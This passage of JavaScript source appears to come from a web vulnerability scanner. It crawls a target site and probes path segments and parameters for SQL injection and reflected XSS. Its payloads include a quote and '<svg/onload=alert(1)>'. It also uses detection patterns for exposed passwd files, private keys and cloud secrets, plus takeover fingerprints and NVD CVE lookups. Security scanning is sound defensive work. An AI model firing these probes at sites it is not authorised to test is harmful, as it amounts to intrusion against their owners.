  onNote?.(`probing ${tasks.length} param${tasks.length === 1 ? "" : "s"} on ${label}`);
  // Parallel with a small concurrency cap so long-timeout requests don't stall the run.
  const CONCURRENCY = 4;
  const HARD_BUDGET_MS = 90_000;
  const started = Date.now();
  let idx = 0;
  async function worker() {
    while (idx < tasks.length) {
      if (Date.now() - started > HARD_BUDGET_MS) return;
      const { v, key } = tasks[idx++];
      try {
        onNote?.(`  → ?${key}`);
        const f = await probeOneParam(v.url, key, baseline, onNote, { guessed: v.guessed });
        all.push(...f);
      } catch {}
    }
  }
  await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  return all;
}


/**
 * Test likely-id path segments (numeric or hex) as if they were parameters:
 *   /product/123 → /product/123'  /product/123''
 */
async function probePathSegments(startUrl, pages, onNote) {
  const findings = [];
  const targets = new Set();
  for (const p of [startUrl, ...pages.map((x) => x.url)]) {
    try {
      const u = new URL(p);
      const segs = u.pathname.split("/").filter(Boolean);
      for (let i = 0; i < segs.length; i++) {
        if (/^\d+$|^[a-f0-9]{6,}$/i.test(segs[i])) {
          targets.add(JSON.stringify({ origin: u.origin, segs, idx: i }));
        }
      }
    } catch {}
  }
  for (const raw of [...targets].slice(0, 8)) {
    const { origin, segs, idx } = JSON.parse(raw);
    const orig = segs[idx];
    const build = (val) => `${origin}/${[...segs.slice(0, idx), val, ...segs.slice(idx + 1)].join("/")}`;
    const benign = await fetchWithTiming(build(orig));
    if (!benign.ok) continue;
    const quote = await fetchWithTiming(build(`${orig}'`));
    const dbl = await fetchWithTiming(build(`${orig}''`));
    if (!quote.ok) continue;
    const err = SQLI_ERRORS.find((rx) => rx.test(quote.body));
    if (err) {
      findings.push(mkFinding({
        type: "sqli-error", severity: "high", confidence: "high",
        title: `SQL error reflected on path segment /${orig}`,
        url: build(`${orig}'`), param: `path[${idx}]`, payload: `${orig}'`,
        description: "Appending a single quote to a URL path segment triggered a database error.",
        evidence: (quote.body.match(err) || [""])[0].slice(0, 240),
        remediation: "Parameterize the query and validate path segments.",
      }));
      onNote?.(`sqli on path segment /${orig}`);
      continue;
    }
    if (dbl.ok && quote.status >= 500 && benign.status < 500 && dbl.status < 500) {
      findings.push(mkFinding({
        type: "sqli-status", severity: "high", confidence: "medium",
        title: `Server error on quote injection in path /${orig}`,
        url: build(`${orig}'`), param: `path[${idx}]`, payload: `${orig}'`,
        description: `Path with "'" returns ${quote.status}; escaped "''" returns ${dbl.status}.`,
        remediation: "Parameterize the query.",
      }));
      onNote?.(`sqli path-status on /${orig}`);
    }
    const m = MARKER();
    const xssPayload = `<svg/onload=alert(1)>${m}`;
    const rx = await fetchWithTiming(build(encodeURIComponent(xssPayload)));
    if (rx.ok && rx.body.includes(xssPayload)) {
      findings.push(mkFinding({
        type: "xss-reflected", severity: "high", confidence: "high",
        title: `Reflected XSS via path segment /${orig}`,
        url: build(encodeURIComponent(xssPayload)), param: `path[${idx}]`, payload: xssPayload,
        description: "Path segment reflected verbatim in HTML response.",
        remediation: "HTML-encode path segments in output.",
      }));
      onNote?.(`XSS on path segment /${orig}`);
    }
  }
  return findings;
}


// ────────────────────────── path probing ──────────────────────────

async function probePaths(origin, onNote) {
  const findings = [];
  const results = await pool(COMMON_PATHS, async (p) => {
    const url = new URL(p, origin).toString();
    const r = await fetchWithTiming(url);
    return { p, url, r };
  }, 8);
  for (const { p, url, r } of results) {
    if (!r?.ok) continue;
    if (r.status === 200) {
      const body = r.body || "";
      const suspicious =
        p.startsWith("/.git") || p === "/.env" || p.endsWith(".env") || p.endsWith(".env.local") || p.endsWith(".env.production") ||
        p.startsWith("/actuator") || p === "/server-status" ||
        /root:x:0:0|BEGIN (?:RSA |EC )?PRIVATE KEY|APP_KEY=|DB_PASSWORD|AWS_SECRET|access_key|secret[_-]?key/i.test(body);
      findings.push(mkFinding({
        type: "exposed-path", severity: suspicious ? "high" : "info",
        confidence: suspicious ? "high" : "medium",
        title: `Accessible: ${p}`,
        description: suspicious
          ? "Response body contains sensitive data — treat as leaked."
          : `HTTP 200 at ${p} — verify whether this exposure is intentional.`,
        path: p, url, evidence: suspicious ? body.slice(0, 300) : `HTTP 200`,
        remediation: "Restrict, remove, or authenticate this path.",
      }));
      onNote?.(`${p} → 200${suspicious ? " (sensitive!)" : ""}`);
    } else if (r.status === 401 || r.status === 403) {
      // presence-only leak
      findings.push(mkFinding({
        type: "exposed-path", severity: "info", confidence: "low",
        title: `Path present but restricted: ${p}`,
        description: `HTTP ${r.status} — resource exists but is protected. Useful recon signal.`,
        path: p, url,
      }));
    }
  }
  // Directory listing check on root + a couple guesses
  for (const p of ["/", "/uploads/", "/files/", "/backup/", "/static/"]) {
    const r = await fetchWithTiming(new URL(p, origin).toString());
    if (r.ok && /<title>Index of\s/i.test(r.body)) {
      findings.push(mkFinding({
        type: "dir-listing", severity: "medium", url: new URL(p, origin).toString(),
        title: `Directory listing enabled at ${p}`,
        description: "Server returns an autogenerated directory index — files are enumerable.",
        remediation: "Disable directory indexing (Options -Indexes / autoindex off).",
      }));
    }
  }
  return findings;
}

// ────────────────────────── method allow-list ──────────────────────────

async function probeMethods(url) {
  const findings = [];
  try {
    const r = await timedFetch(url, { method: "OPTIONS" });
    const allow = r.headers.get("allow") || r.headers.get("access-control-allow-methods") || "";
    if (/TRACE/i.test(allow)) findings.push(mkFinding({
      type: "http-trace", severity: "low", url,
      title: "HTTP TRACE enabled", description: "TRACE can enable Cross-Site Tracing.",
      remediation: "Disable TRACE on the web server.",
    }));
    if (/PUT|DELETE/i.test(allow) && !/api/i.test(url)) findings.push(mkFinding({
      type: "http-methods", severity: "info", url,
      title: `Uncommon methods allowed: ${allow}`,
      description: "Verify these are intended and access-controlled.",
    }));
  } catch {}
  return findings;
}

// ────────────────────────── subdomain-takeover fingerprints ──────────────────────────

const TAKEOVER_FINGERPRINTS = [
  { name: "GitHub Pages", rx: /There isn't a GitHub Pages site here/i },
  { name: "Heroku", rx: /No such app|herokucdn\.com\/error-pages\/no-such-app/i },
  { name: "AWS S3", rx: /NoSuchBucket|The specified bucket does not exist/i },
  { name: "Azure", rx: /404 Web Site not found/i },
  { name: "Shopify", rx: /Sorry, this shop is currently unavailable/i },
  { name: "Fastly", rx: /Fastly error: unknown domain/i },
  { name: "Unbounce", rx: /The requested URL was not found on this server/i },
  { name: "Surge.sh", rx: /project not found/i },
];
function checkTakeover(url, body) {
  const hits = TAKEOVER_FINGERPRINTS.filter((f) => f.rx.test(body));
  return hits.map((h) => mkFinding({
    type: "subdomain-takeover", severity: "high", confidence: "medium", url,
    title: `Possible subdomain takeover fingerprint (${h.name})`,
    description: "Response matches a known dangling-service fingerprint. Verify DNS points to a claimable resource.",
    remediation: "Remove the dangling DNS record or reclaim the service.",
  }));
}

// ────────────────────────── CVE lookup (NVD) ──────────────────────────

async function cveLookup(fingerprints, onNote) {
  const out = []; const seen = new Set();
  for (const fp of fingerprints) {
    const m = /^([A-Za-z][\w.-]*)[\/ ]v?(\d+\.\d+(?:\.\d+)?)/.exec(fp.value || "");
    if (!m) continue;
    const [, product, version] = m;
    const key = `${product}:${version}`.toLowerCase();
    if (seen.has(key)) continue; seen.add(key);
    const q = `${product} ${version}`;
    try {
      const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(q)}&resultsPerPage=6`;
      const res = await timedFetch(url);
      if (!res.ok) continue;
      const body = await res.json();
      const items = (body.vulnerabilities || []).slice(0, 6).map((v) => {
        const c = v.cve || {};
        const cvss = c.metrics?.cvssMetricV31?.[0]?.cvssData
                  || c.metrics?.cvssMetricV30?.[0]?.cvssData
                  || c.metrics?.cvssMetricV2?.[0]?.cvssData || {};
        return {
          id: c.id, severity: (cvss.baseSeverity || "unknown").toLowerCase(),
          score: cvss.baseScore, vector: cvss.vectorString,
          summary: c.descriptions?.find((d) => d.lang === "en")?.value?.slice(0, 260),
          references: (c.references || []).slice(0, 3).map((r) => r.url),
        };
      });
      if (items.length) { out.push({ product, version, cves: items }); onNote?.(`${items.length} CVE hits for ${product} ${version}`); }
    } catch {}
  }
  return out;
}

// ────────────────────────── main entry ──────────────────────────

/**
 * Deep scan against a single URL. Non-destructive.
 *
 * @param {string} target
 * @param {object} [opts]
 * @param {(note:string)=>void} [opts.onNote]
 * @param {number} [opts.maxPages]
 * @returns {Promise<object>} normalized scan result
 */
export async function scanTarget(target, opts = {}) {
  const onNote = opts.onNote || (() => {});
  const u = normalize(target);
  onNote(`baseline ${u.origin}${u.pathname}`);
  const baseline = await fetchWithTiming(u.toString());
  if (!baseline.ok) throw new Error(`baseline failed: ${baseline.error}`);

  onNote("crawling in-scope pages");
  const pages = await crawl(u.toString(), onNote);

  // Aggregate forms + URL params across crawl
  const allForms = [];
  const paramUrls = new Set([u.toString()]);
  for (const p of pages) {
    for (const f of extractForms(p.url, p.body)) allForms.push(f);
    try {
      const purl = new URL(p.url);
      if ([...purl.searchParams.keys()].length) paramUrls.add(purl.toString());
    } catch {}
  }
  const forms = dedupe(allForms, (f) => f.method + "|" + f.action + "|" + f.inputs.map((i) => i.name).sort().join(","));

  onNote(`analysing ${pages.length} pages, ${forms.length} forms, ${paramUrls.size} param URLs`);

  const fingerprints = fingerprintSoftware(baseline.headers, baseline.body);
  const headerFindings = analyzeHeaders(baseline.url, baseline.headers);
  const secretFindings = [];
  for (const p of pages) secretFindings.push(...scanBodyForSecrets(p.url, p.body));
  const takeoverFindings = checkTakeover(baseline.url, baseline.body);

  onNote("probing common paths");
  const pathFindings = await probePaths(u.origin, onNote);

  onNote("checking HTTP methods");
  const methodFindings = await probeMethods(u.toString());

  onNote("probing query parameters (SQLi/XSS/LFI/SSTI/CMDi/CRLF/redirect)");
  const paramFindings = [];
  const paramUrlList = [...paramUrls];
  for (let i = 0; i < paramUrlList.length; i++) {
    const purl = paramUrlList[i];
    onNote(`param URL ${i + 1}/${paramUrlList.length}: ${new URL(purl).pathname || "/"}`);
    const allowGuess = i === 0; // only guess on the base URL to avoid explosion
    const f = await probeParamsOnUrl(purl, baseline, onNote, { allowGuess });
    paramFindings.push(...f);
  }


  onNote("probing URL path segments (SQLi/XSS on /route/:id)");
  const pathSegFindings = await probePathSegments(u.toString(), pages, onNote).catch(() => []);

  // Forms without CSRF tokens
  const csrfFindings = forms
    .filter((f) => f.method === "post" && !f.hasCsrf)
    .map((f) => mkFinding({
      type: "csrf-missing", severity: "medium", confidence: "medium", url: f.action,
      title: `POST form has no CSRF token field`,
      description: `Form action ${f.action} accepts POST without any csrf/_token field visible in HTML.`,
      remediation: "Include and validate a per-session anti-CSRF token, or use SameSite=Strict cookies + Origin check.",
    }));

  onNote("checking NVD for known CVEs");
  const cves = await cveLookup(fingerprints, onNote);

  onNote("deep probes: graphql · host-header · cache · proto-pollution · smuggling · webdav");
  const [
    graphqlF, hostF, cacheF, protoF, extraMethodF, formF,
  ] = await Promise.all([
    probeGraphQL(u.origin, onNote).catch(() => []),
    probeHostHeader(baseline.url).catch(() => []),
    probeCachePoisoning(baseline.url).catch(() => []),
    probeProtoPollution([...paramUrls][0] || baseline.url).catch(() => []),
    probeExtraMethods(baseline.url).catch(() => []),
    probeFormBodies(forms, onNote).catch(() => []),
  ]);
  const smugglingF = smugglingIndicators(baseline.url, baseline.headers);
  const jwtF = [];
  for (const p of pages) jwtF.push(...scanJwts(p.url, p.body));
  jwtF.push(...scanJwts(baseline.url, String(baseline.headers["set-cookie"] || "")));
  const domF = [];
  for (const p of pages) if (/\.js(?:\?|$)/i.test(p.url) || /<script/i.test(p.body)) domF.push(...scanDomSinks(p.url, p.body));
  const wsF = detectWebsocket(baseline.url, baseline.headers, baseline.body);

  onNote("enumerating subdomains via CT logs");
  const subF = await subdomainEnum(u.hostname, onNote).catch(() => []);

  const allFindings = [
    ...headerFindings, ...secretFindings, ...takeoverFindings,
    ...pathFindings, ...methodFindings, ...paramFindings, ...pathSegFindings, ...csrfFindings,
    ...graphqlF, ...hostF, ...cacheF, ...protoF, ...extraMethodF, ...formF,
    ...smugglingF, ...jwtF, ...domF, ...wsF, ...subF,
  ];

  // Normalize + dedupe
  const findings = dedupe(allFindings, (f) => f.id);
  const bySeverity = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of findings) bySeverity[f.severity] = (bySeverity[f.severity] || 0) + 1;

  return {
    target: u.toString(),
    scannedAt: new Date().toISOString(),
    baseline: { status: baseline.status, finalUrl: baseline.url, size: baseline.size, timeMs: baseline.timeMs },
    crawl: { pages: pages.length, forms: forms.length, paramUrls: paramUrls.size },
    fingerprints,
    findings,
    cves,
    summary: {
      total: findings.length,
      bySeverity,
      byType: findings.reduce((a, f) => (a[f.type] = (a[f.type] || 0) + 1, a), {}),
    },
  };
}
